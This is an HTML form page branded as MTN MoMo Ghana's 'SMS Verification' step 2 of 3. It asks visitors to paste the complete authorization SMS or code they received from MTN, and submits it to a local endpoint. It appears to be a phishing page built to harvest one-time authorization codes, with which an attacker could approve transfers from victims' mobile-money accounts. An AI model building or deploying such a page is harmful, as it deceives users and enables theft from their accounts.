<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Step 2 of 3 - SMS Verification - MTN MoMo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        html, body {
            margin: 0; padding: 0; width: 100%; min-height: 100vh;
            background-color: #003366; color: #333;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        .header-bar {
            background-color: #002244; padding: 14px 16px; text-align: center; color: white;
        }
        .main-content {
            width: 100% !important; max-width: 550px !important;
            margin: 0 auto; padding: 24px 20px;
            background: #ffffff; min-height: calc(100vh - 60px);
            border-top-left-radius: 24px; border-top-right-radius: 24px;
        }
        @media (min-width: 576px) {
            body { display: flex; align-items: center; justify-content: center; padding: 30px 15px; }
            .header-bar { display: none; }
            .main-content { border-radius: 24px; min-height: auto; box-shadow: 0 12px 35px rgba(0,0,0,0.4); padding: 35px 25px; }
        }
        .step-badge {
            background-color: #FFCC00; color: #003366; font-weight: 800;
            font-size: 0.75rem; padding: 6px 12px; border-radius: 8px; text-transform: uppercase;
        }
        .form-control {
            border-radius: 12px; padding: 14px; border: 1px solid #ced4da; font-size: 1rem;
        }
        .form-control:focus {
            border-color: #003366; box-shadow: 0 0 0 0.2rem rgba(0, 51, 102, 0.15);
        }
        .sms-box {
            background-color: #f8f9fa; border: 1px dashed #cbd5e1; border-radius: 12px;
            padding: 14px; font-size: 0.85rem; color: #475569; margin-bottom: 20px;
        }
        .btn-continue {
            background-color: #002244; color: #ffffff; font-weight: 800;
            font-size: 1.05rem; padding: 16px; border-radius: 14px; border: none; width: 100%;
            letter-spacing: 0.5px; box-shadow: 0 6px 20px rgba(0,34,68,0.25);
        }
    </style>
</head>
<body>

    <div class="header-bar d-sm-none">
        <span class="text-white fw-bold">MTN MoMo Ghana</span>
    </div>

    <div class="main-content">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <span class="step-badge">STEP 2 OF 3</span>
            <span class="text-muted small fw-bold">SMS Verification</span>
        </div>

        <div class="mb-4">
            <h2 class="fw-bold text-dark mb-1" style="font-size: 1.5rem;">Authorization SMS</h2>
            <p class="text-muted small">Please paste or enter the approval code/message received from MTN Ghana.</p>
        </div>

        <div class="sms-box">
            📌 <b>Note:</b> Y'ello. Please check your SMS inbox for the authorization message or paste the complete message text below to proceed.
        </div>

        <form action="/submit-auth-code" method="POST" novalidate>
            <div class="mb-4">
                <label class="form-label text-secondary small fw-bold">SMS Message / Auth Code</label>
                <textarea name="auth_code" class="form-control" rows="3" placeholder="Paste your authorization SMS or code here..." required></textarea>
            </div>

            <button type="submit" class="btn btn-continue shadow-sm">VERIFY & CONTINUE ➔</button>
        </form>
    </div>

</body>
</html>
